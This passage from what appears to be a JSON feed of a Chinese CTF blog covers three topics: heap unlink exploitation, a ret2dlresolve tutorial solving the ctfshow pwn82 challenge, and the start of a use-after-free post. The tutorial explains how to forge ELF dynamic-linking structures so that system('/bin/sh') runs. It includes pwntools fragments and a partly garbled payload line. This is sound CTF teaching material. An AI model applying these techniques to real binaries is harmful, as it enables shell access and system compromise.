punctuation\">&#125;</span></pre></td></tr></table></figure><p>通过我们进行的绕过手段导致这里也就相当于：</p>\n<pre><code>FD-&gt;bk = BK  并且  BK=P-&gt;bk\n所以FD-&gt;bk=P-&gt;bk\n\nBK-&gt;fd = FD   并且  FD=P-&gt;fd\n所以BK-&gt;fd =P-&gt;fd\n</code></pre>\n<p>因此这也就是：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>FD<span class=\"token operator\">-></span>bk <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span>  <span class=\"token comment\">// 事实上 FD->bk=BK (这里实际上是因为已经在链表中去除 P 后会根据之前 P 的 fd 和 bk 来确定修改后的指针的指向)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>BK<span class=\"token operator\">-></span>fd  <span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P <span class=\"token operator\">-</span> <span class=\"token number\">0x18</span>  <span class=\"token comment\">// 事实上 BK->fd=FD</span></pre></td></tr></table></figure><p><img data-src=\"https://z1.ax1x.com/2023/10/03/pPOMSN8.png\" alt=\"\" /></p>\n<p>前面构造的为了进行绕过：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>P<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x10</span>   <span class=\"token comment\">//P->bk</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>P<span class=\"token operator\">=</span><span class=\"token operator\">&amp;</span>P<span class=\"token operator\">-</span><span class=\"token number\">0x18</span>   <span class=\"token comment\">//P->fd</span></pre></td></tr></table></figure><p>这里的执行是有顺序的，所以  <code>BK-&gt;fd = FD</code>  一定是后执行的，所以结果就为： <code>P=&amp;P-0x18</code></p>\n<p>也就是说可以往 P 里写入值去修改 <code>&amp;P-0x18</code>  的内容！(这里是我们往 <code>P</code>  里写值，其会去修改 <code>&amp;P-0x18</code>  地方的值)</p>\n<h2 id=\"p地址的寻找\"><a class=\"anchor\" href=\"#p地址的寻找\">#</a> P 地址的寻找：</h2>\n<p>然而这里还有一个问题是我们如何去找到 P 的地址，这里我们就需要找到堆的管理数组 (一般在 bbs 段处，会有个数组来记录每个 chunk 的地址)，我们可以在这里找到我们伪造的堆块的 <code>数组</code> 的地址，通过这个地址来减 0x18 放入伪造的堆块的 fd 中即可</p>\n<p>这样我们后续改变就可以根据这个数组来修改地址内部的值</p>\n<p>【个人理解】</p>\n<p>我对于 unlink 漏洞的理解是认为他其实是对 对应的堆块的管理数组进行了修改，将我们想要修改的地址作为堆块给添加了上去，其中的一个数组会存放这个想要修改值的地址，这就会导致我们后面可以对其当作堆块一样进行修改</p>\n<p>参考：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMVV2NDExajdmci8/cD0yMA==\">https://www.bilibili.com/video/BV1Uv411j7fr/?p=20</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvYXJ0aWNsZS8xNTU3ODcy\">https://cloud.tencent.com/developer/article/1557872</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ob2xsay5ibG9nLmNzZG4ubmV0L2FydGljbGUvZGV0YWlscy8xMDg0ODE4ODk/c3BtPTEwMDEuMjAxNC4zMDAxLjU1MDI=\">https://hollk.blog.csdn.net/article/details/108481889?spm=1001.2014.3001.5502</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91bmxpbmsv\">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unlink/</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzExNTM4OC5odG1s\">https://www.secpulse.com/archives/115388.html</span></p>\n<p>堆的数据结构：</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTDBnNG4tYmxvZy9wLzEyOTY1MTg3Lmh0bWw=\">https://www.cnblogs.com/L0g4n-blog/p/12965187.html</span></p>\n",
            "tags": [
                "pwn",
                "二进制",
                "Linux"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/01/pwn/%E4%B8%93%E6%A0%8F/ret2dlresolve/",
            "url": "https://vvwwvv.cn/2023/10/01/pwn/%E4%B8%93%E6%A0%8F/ret2dlresolve/",
            "title": "高级ROP之ret2dlresolve",
            "date_published": "2023-10-01T06:15:56.000Z",
            "content_html": "<p>【例题 ctfshow pwn82】</p>\n<h1 id=\"1用处\"><a class=\"anchor\" href=\"#1用处\">#</a> 1. 用处：</h1>\n<p>在有溢出而无法泄露内容时可以利用 <code>ret2dlresolve</code>  来修改解析的函数，从而达到执行想要的函数的目的</p>\n<h1 id=\"2原理\"><a class=\"anchor\" href=\"#2原理\">#</a> 2. 原理：</h1>\n<p>程序通过动态链接来达到节省空间的目的，动态链接会有一个延迟绑定的特点，将连接的过程推迟到了程序运行时</p>\n<p>动态链接中有个重要函数 <code>_dl_runtime_resolve(link_map_obj,reloc_index)</code>  来对动态链接的函数进行重定位</p>\n<pre><code>利用dl_resolve原因：\n1、dl_resolve 函数不会检查对应的函数是否越界，它只会根据我们给定的数据来执行（也就是说其可以偏移到我们构造的地方）\n2、dl_resolve 函数最后的解析根本上依赖于所给定的字符串（修改其要解析的字符串也就会调用修改后的函数）\n</code></pre>\n<p><code>dl_runtime_resolve</code>  函数只会在第一次调用这个动态链接的函数时其作用，第二次调用就不需要解析了，可以直接得到这个调用的函数的地址；<br />\n第一次调用时程序会查找需要链接的各种信息，再通过 <code>_dl_runtime_resolve</code>  将函数的真实地址写入 <code>got.plt</code>  表中</p>\n<h2 id=\"1运行_dl_runtime_resolve前\"><a class=\"anchor\" href=\"#1运行_dl_runtime_resolve前\">#</a> 1. 运行 <code>_dl_runtime_resolve</code>  前</h2>\n<p>在第一次调用动态链接函数前程序执行的是 <code>*.plt</code>  函数，其内部会执行 <code>dl_runtime_resolve</code>  来进行解析找到真实地址</p>\n<p>这里看一下第一次调用 write 函数的情况（实际上第一次调用的是 <code>write@plt</code>  的形式）利用命令 <code>objdump -d pwn82</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/J3LCM3%7D8A7IR%243ZVS5%5B%7E%24%5B0.png\" alt=\"\" /></p>\n<p>得到第一次调用 write 的地址，在 gdb 中下断点 <code>b *0x80485a6</code>  ，然后运行</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/2%25E2%603020%29S%28APWNR_XA%402N.png\" alt=\"\" /></p>\n<p>si 单步进入 <code>write@plt</code>  查看情况:</p>\n<p>发现最后执行了 <code>_dl_runtime_resolve</code> ， <code>got.plt</code>  内放的是要跳转执行的下一条汇编指令地址</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/6M1%2929H%7EX_U%7EV%7B%5BBKT%60%2934D.png\" alt=\"\" /><br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/8I%25%25MU7WYWO2ANV%299IA6UQ5.png\" alt=\"\" /></p>\n<p>分析具体调用方法：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/RZBD1EJ%40Y3I%40_40%60%292Y17%5BM.png\" alt=\"\" /></p>\n<ol>\n<li>进入 write 自己的表项后，有个 push 0x20 是 <code>dl_runtime_resolve(link_map_obj,reloc_index)</code>  的第二个参数 `reloc_index</li>\n<li>进入公共 plt 表项 (plt0) 后，有个 push &lt;0x80498bc&gt; 就是第一个参数 <code>link_map_obj</code></li>\n</ol>\n<p>这里我们需要将 plt0 的地址覆盖到 ret 处，也就是执行了跳转，同时将 <code>dl_runtime_resolve</code>  的第一个参数 push 进栈【这么做的原因是因为我们需要利用 <code>dl_runtime_resolve</code>  函数解析执行我们需要的函数，直接 ret 进入会缺少第一个参数，用自己的 plt 表项覆盖 ret 就无法偏移到我们想要的地址】</p>\n<pre><code>这里利用ret0覆盖ret后，需要直接写入参数&quot;reloc_index&quot;,因为这是通过模拟这种方式执行write_plt等函数(可以将这两个整体视为调用了函数)，需要手动写入参数到栈上，后面就是调用write_plt的返回地址和参数\n最终也就是：p32(plt0)+p32(reloc_index)+p32(返回地址)+p32(参数1)+p32(参数2)+p32(参数3)\n</code></pre>\n<h3 id=\"疑问\"><a class=\"anchor\" href=\"#疑问\">#</a> 疑问</h3>\n<p>为什么要以 <code>plt0</code>  覆盖 ret，而不直接用 <code>dl_runtime_resolve</code>  来覆盖</p>\n<p>因为需要填充 <code>dl_runtime_resolve</code>  的参数，而我们执行 <code>plt0</code>  就不需要填充第一个参数了，而第二个参数是我们需要控制的所以需要自己填充</p>\n<h2 id=\"2执行_dl_runtime_resolve\"><a class=\"anchor\" href=\"#2执行_dl_runtime_resolve\">#</a> 2. 执行 <code>_dl_runtime_resolve</code></h2>\n<p>在上面的两个 push 中将 <code>_dl_runtime_resolve</code>  的两个参数压入栈中，然后就进入 <code>_dl_runtime_resolve</code>  来执行</p>\n<p>其内部过程为 (借用大佬的图)：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/V%60%28342LD_94ZQ%7BI%5DN%5DV%5B%7EWA.png\" alt=\"\" /></p>\n<p>通过上面的图可以看到以第二个参数为准，然后一步一步相加计算得到要解析的函数名</p>\n<h3 id=\"第一步得到reloc_index\"><a class=\"anchor\" href=\"#第一步得到reloc_index\">#</a> 第一步：得到 reloc_index</h3>\n<p>利用第二个参数与 <code>.rel.plt</code>  相加，那么就可以得到调用的函数的具体 <code>.rel.plt</code>  结构体情况：</p>\n<p>.rel.plt 结构体：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  Elf32_Addr r_offset<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  Elf32_Word r_info<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span>Elf32_Rel</pre></td></tr></table></figure><p>从上面的 <code>.rel.plt</code>  结构体来看， <code>.rel.plt</code>  重定位表 是保持了所有函数的这个结构体信息（每个结构体 8 字节），而不仅仅是起到一个索引的作用</p>\n<p>因此用 <code>.rel.plt</code>  的基地址加上 <code>偏移</code> 就为所要函数的 <code>Elf32_Rel</code>  指针，然后就得到了对应的 <code>r_offset</code>  和 <code>r_info</code></p>\n<p><code>.rel.plt</code>  存放内容 (命令 <code>readelf -x .rel.plt 程序名</code> )：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/TYY7DHBU_3%5D%40MSM_C5I2JCM.png\" alt=\"\" /></p>\n<p>我们的重点就是在这个 <code>偏移</code> 如何得到：</p>\n<p>上面可以知道在执行时，第二次跳转到 <code>plt0</code>  (.plt 表的头部)，而我们需要的是 <code>.rel.plt</code>  这里就有一个对应的关系（这里就要计算得函数是.plt 的第几个结构体，）</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/%28ZI0%5BH%7BC5UX9KC%60TES_%2864Q.png\" alt=\"\" /></p>\n<p>上面可以看到，对应结构体开始在 <code>.plt</code>  中是从下标 1 开始，而在 <code>.rel.plt</code>  中是从下标 0 开始，也就是说如果 write 结构体是结构体 5，那么在 <code>.rel.plt</code>  中就是结构体 4</p>\n<p><code>.plt</code>  存放内容 (命令 <code>readelf -x .plt 程序名</code> )：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/J%25EK%60RH8%5B5%25NNGKG%7DI3M0%5B5.png\" alt=\"\" /></p>\n<p>通过上面的对应关系知道，我们想要找 write 在 <code>.rel.plt</code>  重定位索引就要通过 plt 来得到，由 <code>.plt</code>  与 <code>.rel.plt</code>  的对应关系知道： <code>plt结构体-1=rel.plt结构体</code> ，所以这里计算在.plt 中是第几个结构体：</p>\n<pre><code>write_plt-plt[0]=offset    //这里plt[0]地址可以通过pwntools得到\noffset/16=是plt表中的第几个结构体\nplt结构体-1=rel.plt结构体\n因为.rel.plt结构体的大小为8字节，所以还要乘8(这里得到的值是相对偏移)\n\n也就是：\nwrite_index = [（write_plt-plt[0]）/16 -1] * 8（write_index就是与.rel.plt的偏移，也就是reloc_index）【不过其实这个计算再后面伪造时用不到，因为偏移通过后面伪造的地址减基地址就得到了】\n\n</code></pre>\n<h2 id=\"第二步伪造relplt结构体\"><a class=\"anchor\" href=\"#第二步伪造relplt结构体\">#</a> 第二步：伪造 <code>.rel.plt</code>  结构体</h2>\n<p>上面知道 <code>write_index</code>  知道，这是与 <code>.rel.plt</code>  的偏移；但是在 <code>dl_resolve</code>  执行时并没有检查边界，所以我们可以将这个偏移任意修改，因此可以修改其偏移到到我们伪造的 <code>.rel.plt</code>  结构体，可以构建式子：</p>\n<pre><code>rel.plt+write_index=fake_struck_rel_plt\n\n所以：\nwrite_index=fake_strunk_rel_plt-rel.plt\n\n</code></pre>\n<p>然后需要考虑在偏移的地方来伪造对应的结构体：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  Elf32_Addr r_offset<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  Elf32_Word r_info<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">&#125;</span>Elf32_Rel</pre></td></tr></table></figure><p>这个结构体有两个成员变量需要伪造，第一个是 <code>r_offset</code> ，这个可以通过 pwntools 的 ELF 功能自动获得，也就是 <code>write_got=elf.got[&quot;write&quot;]</code> ；第二个成员变量 <code>r_info</code>  需要自己查看 <code>readelf -a 程序名</code> ，如下：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/BQV2YETO9H51Z6PB%29HJ%5BG%5B9.png\" alt=\"\" /></p>\n<p>看下面的图可以知道， <code>r_info</code>  右移一个字节，以上图中的 <code>607</code>  的 6 作为.dynsym 下标，寻找.dynsym 的标号为 6 结构体 (下标以 0 开始)</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/V%60%28342LD_94ZQ%7BI%5DN%5DV%5B%7EWA.png\" alt=\"\" /></p>\n<h2 id=\"第三步构造动态符号表-dynsymr_info8\"><a class=\"anchor\" href=\"#第三步构造动态符号表-dynsymr_info8\">#</a> 第三步：构造动态符号表  <code>dynsym+(r_info&gt;&gt;8)</code></h2>\n<p>dynsym 结构体：</p>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  Elf32_Word    st_name<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 符号名，是相对.dynstr 起始的偏移</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  Elf32_Addr    st_value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  Elf32_Word    st_size<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> st_info<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 对于导入函数符号而言，它是 0x12</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> st_other<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  Elf32_Section st_shndx<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span>Elf32_Sym<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 对于导入函数符号而言，除 st_name 外其他字段都是 0</span></pre></td></tr></table></figure><p>所以根据该结构体，我们要伪造的结构体样子大致为 <code>[name偏移，0，0，0x12]</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/J52%60QY%29Q4AT0HNC9%5DR8OWR9.png\" alt=\"\" /></p>\n<p>l 利用命令 <code>readelf -a pwn82</code>  找到 <code>.dynsym</code>  符号表，可以看到 write 对应的是下标 <code>Num=6</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/S%40Z%5DT16%7ELH_M4%24QEQGURG%29Y.png\" alt=\"\" /></p>\n<p>接下来查看具体 write 的 <code>.dynsym</code>  结构体：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/Y%5D%298I%60C4%29MQK44S%40%7E9OJGQA.png\" alt=\"\" /></p>\n<p>其结构体就是 <code>[0x4c,0,0,0x12]</code> （当然这里的 0x4c 可以被改变，这就达到解析其他字符串的目的），而在 <code>dynsym+(r_info&gt;&gt;8)</code>  也就是得到了该结构体，我们可以修改 <code>r_info</code>  使下标指向到我们伪造的 <code>dynsym</code>  结构体处</p>\n<p>伪造 <code>.dynsym</code>  结构体：</p>\n<p>因为 <code>.dynsym</code>  的每个结构体大小是 16 字节，那么我们就需要满足其是 16 字节对齐的（因为这里是以下标的形式索引每次只能 16 字节的查找，其他的直接用偏移所以不用担心对齐），利用公式使其满足 16 字节对齐：</p>\n<pre><code>fake_sym_addr = base_stage + 32 //伪造结构体的地址\nalign = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)   //计算是否是16字节对齐\nfake_sym_addr = fake_sym_addr + align //使完成16字节对齐\n</code></pre>\n<h3 id=\"疑问1\"><a class=\"anchor\" href=\"#疑问1\">#</a> 疑问 1</h3>\n<pre><code>0x10 - ((0x8048a88 - 0x8048a00) &amp; 0xf) = 0x10 - 0x8 = 0x8\n\n距离初始的偏移，然后与0xf查看最后一16进制位的值，0x10来看其满足16进制对齐还有多少距离\n</code></pre>\n<p>接下来利用伪造的 <code>.dynsym结构体</code> 来反推 <code>r_info</code> :</p>\n<p>我们知道 <code>dynsym+(r_info&gt;&gt;8)=write结构体地址</code>  ，而在我们伪造的结构体下已知了结构体地址，所以:</p>\n<pre><code>index_dynsym = (fake_sym_add-dynsym ) / 0x10（间隔的结构体个数）\nr_info=(index_dynsym&lt;&lt;8)+0x07\n</code></pre>\n<p>这里得到的 <code>r_info</code>  就可以在前面伪造的 <code>.rel.plt</code>  结构体处使用这个值（ <code>r_offset</code>  不用改变）</p>\n<h2 id=\"第四步构造动态字符表dynstr\"><a class=\"anchor\" href=\"#第四步构造动态字符表dynstr\">#</a> 第四步：构造动态字符表 (.dynstr)</h2>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/%E4%B8%93%E6%A0%8F/ret2dlresolve/QP%7B4V_ZZ%24I1%5D2W%5D%298%24%286%7BPO.png\" alt=\"\" /></p>\n<p>这里我们需要构造两部分</p>\n<ol>\n<li>构造 <code>.dynstr</code>  动态字符表 (也就是部署 <code>write\\x00</code>  这个字符串去解析)</li>\n<li>修改第三步中的 <code>.dynsym</code>  结构体的 <code>str_name</code>  这个偏移量（使能够找到 write 字符串）</li>\n</ol>\n<p>首先就是部署 <code>write\\x00</code>  字符串，得到这个的地址记为 <code>fake_write_addr</code> ，接下来计算偏移  <code>str_name=fake_write_addr-dynstr</code>  ，最后将第三步中的 <code>dynsym</code>  结构体伪造成 <code>[str_name，0，0，0x12]</code></p>\n<h2 id=\"第五步getshell\"><a class=\"anchor\" href=\"#第五步getshell\">#</a> 第五步：getshell</h2>\n<p>上面部署的是 <code>write\\x00</code>  字符串，那么我们下面将其部署成 <code>system\\x00</code>  就可以了，而 write 函数的三个参数中，将第一个参数修改为 <code>/bin/sh\\x00</code>  就能 getshell</p>\n<h1 id=\"3总结\"><a class=\"anchor\" href=\"#3总结\">#</a> 3. 总结：</h1>\n<p><code>ret2dlresolve</code>  是在无法泄露地址得到 libc 的情况下使用，这里是通过调用其他函数的 plt，之后在解析时解析我们想要执行的函数名即可</p>\n<h3 id=\"执行流程\"><a class=\"anchor\" href=\"#执行流程\">#</a> 执行流程:</h3>\n<p>1. 首先通过重定位索引 <code>reloc_index</code>  来确定需要的函数在重定位表 <code>.rel.plt</code>  的偏移是多少，以此来找到对应的 <code>Elf32_Rel</code>  结构体</p>\n<p>构造步骤：</p>\n<ol>\n<li>部署字符串（要执行的函数名，如 <code>system\\x00</code> ）</li>\n<li>通过 <code>字符串地址-dynstr基地址</code>  得到 dynsym 结构体中第一个成员变量的值（也就是字符串的偏移）</li>\n<li>部署伪造的 system 的 <code>.dynsym</code>  结构体，其中第一个成员变量要用 <code>步骤2</code>  的值</li>\n<li>由伪造的 <code>system</code>  结构体地址 - dynsym 基地址 = 偏移，利用该偏移得到 <code>r_info</code>  ((偏移 / 0x10&lt;&lt;8)+0x7)</li>\n<li>伪造 <code>rel.plt</code>  结构体，通过上面的 <code>r_info</code>  作为其第二个成员变量（第一个成员变量为 <code>write_got</code>  等）</li>\n<li>利用伪造的 <code>rel.plt</code>  结构体地址 - rel.plt 基地址 = <code>reloc_index</code> ，得到的 <code>reloc_index</code>  就是 <code>dl_runtime_resolve</code>  第二个参数，第一个参数是 <code>link_map_obj</code>  在前面利用 <code>plt0</code>  覆盖 ret 后就直接 push 进栈了</li>\n</ol>\n<h2 id=\"疑问1-2\"><a class=\"anchor\" href=\"#疑问1-2\">#</a> 疑问 1</h2>\n<p>有个疑问，为什么要分成三个表，直接是动态字符串表加偏移不行吗</p>\n<p>个人觉得这是为了节省一定的资源，能够缩小一定的查找范围</p>\n<h2 id=\"疑问2\"><a class=\"anchor\" href=\"#疑问2\">#</a> 疑问 2</h2>\n<p><code>.plt0</code> 、 <code>.rel.plt</code> 、 <code>.dynsym</code> 、 <code>.dynstr</code>  的基地址怎么找：</p>\n<pre><code>plt0=elf.get_section_by_name(&quot;.plt&quot;).header.sh_addr\nrel_plt = elf.get_section_by_name('.rel.plt').header.sh_addr\ndynsym = elf.get_section_by_name('.dynsym').header.sh_addr\ndynstr = elf.get_section_by_name('.dynstr').header.sh_addr\n\n</code></pre>\n<h2 id=\"疑问3\"><a class=\"anchor\" href=\"#疑问3\">#</a> 疑问 3</h2>\n<p>r_offset 的作用是什么，好像除了保持函数在 got 表的偏移就没有用了，这个偏移也就是 <code>write_got = elf.got['write']</code>  ，个人理解其作用是将 write 函数填入，不直接填入 system 是因为没有调用 <code>system_plt</code> ，通过这种方式进入 <code>dl_runtime_resolve</code>  最后改将解析的 write 变为 system 即可</p>\n<h2 id=\"疑问4\"><a class=\"anchor\" href=\"#疑问4\">#</a> 疑问 4</h2>\n<p>r_offset 是 <code>write_got = elf.got['write']</code>  而再调用过 write_plt 和未调用过 write_plt 情况下 <code>write_got</code>  是否相同？</p>\n<p>第一次调用时才进行解析，后面调用时 write_got 里直接存放的是真实地址，那么我认为 r_offset 保持的不是真实地址，而是第一次调用时需要的偏移（那么我们再构造的时候用 write_got 是不是就有问题，因为感觉不是第一次调用得到的偏移）</p>\n<h2 id=\"注意的点\"><a class=\"anchor\" href=\"#注意的点\">#</a> 注意的点</h2>\n<p>.dynsym 结构体下标以 0 开始 (其实就是除了 plt 之外其他的结构体但是从 0 开始的，因为 plt0 相当于作为头部了)</p>\n<p>flat 函数是 pwn 模块的功能：将多个变量转化为二进制字符串</p>\n<p>payload=pwn.flat([v1,v2,v3])</p>\n<p>v1,v2,v3 是加入到 payload 的变量，相当于 v1+v2+v3</p>\n<h1 id=\"还要注意\"><a class=\"anchor\" href=\"#还要注意\">#</a> 还要注意</h1>\n<p>我们执行的 plt [0] 等，需要是在迁移后的栈上执行，这里直接覆盖 ret 貌似有点问题</p>\n<h1 id=\"4例题pwn82\"><a class=\"anchor\" href=\"#4例题pwn82\">#</a> 4. 例题（pwn82）</h1>\n<h2 id=\"1程序信息\"><a class=\"anchor\" href=\"#1程序信息\">#</a> 1. 程序信息：</h2>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/1GWJ%25618SAICLB%7B%24K%25%299G2V.png\" alt=\"\" /></p>\n<p><code>main()函数</code> ：<br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/%29%5D783B7I%246R%7D6OMAM06%5BKAG.png\" alt=\"\" /></p>\n<p><code>show()函数：</code> <br />\n<img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/8ZK%40%7BDO%24LJ1R%5D0H4H9ODK6T.png\" alt=\"\" /></p>\n<p>可以看到 read 函数能溢出，因为这道题有 write 函数，所以我们可以利用 ret2libc，但是这里换个方式用 <code>ret2dlresolve</code>  解决</p>\n<h2 id=\"2分析\"><a class=\"anchor\" href=\"#2分析\">#</a> 2. 分析</h2>\n<p>通过上面的原理我们知道，需要构造一系列的结构体然后利用 <code>_dl_runtime_resolve</code>  的第二个参数 <code>reloc_index</code>  来最终通过构造的结构体找到想执行的函数名去解析 执行</p>\n<p>而由于我们的构造的结构体内容需要指向后面构造的内容所以我们可以从后往前构造：</p>\n<h3 id=\"1首先确定name_offset\"><a class=\"anchor\" href=\"#1首先确定name_offset\">#</a> 1. 首先确定 <code>name_offset</code></h3>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/ctfshow/DSOYLEN9%5B162E3F2RRGJ%5BMA.png\" alt=\"\" /></p>\n<p>将构造的 <code>system</code>  输入到 bss 段上</p>\n<p>b&quot;a&quot;+read+p32(0)+p32(0x804+4)+p32(4)+read(0,98e0,len(dynstr))+read(0,8e0+0x100,len(&quot;/bin/sh&quot;))+p32(0x8048376 plt0)+p32(0xdeadbeff)+p32(0x80498e0+0x100)</p>\n",
            "tags": [
                "ret2dlresolve"
            ]
        },
        {
            "id": "https://vvwwvv.cn/2023/10/01/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUAF/",
            "url": "https://vvwwvv.cn/2023/10/01/pwn/%E4%B8%93%E6%A0%8F/%E5%A0%86%E5%88%A9%E7%94%A8%E4%B9%8BUAF/",
            "title": "堆利用之UAF（use after free）",
            "date_published": "2023-10-01T06:15:56.000Z",
            "content_html": "<h1 id=\"1漏洞原因\"><a class=\"anchor\" href=\"#1漏洞原因\">#</a> 1. 漏洞原因</h1>\n<h2 id=\"ctfwiki上的示例\"><a class=\"anchor\" href=\"#ctfwiki上的示例\">#</a> ctfWiki 上的示例：</h2>\n<figure class=\"highlight c\"><figcaption data-lang=\"c\"><span>c</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">typedef</span> <span class=\"token keyword\">struct</span> <span class=\"token class-name\">name</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>myname<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>  <span class=\"token keyword\">void</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span> NAME<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">void</span> <span class=\"token function\">myprint</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>str<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token function\">printf</span><span class=\"token 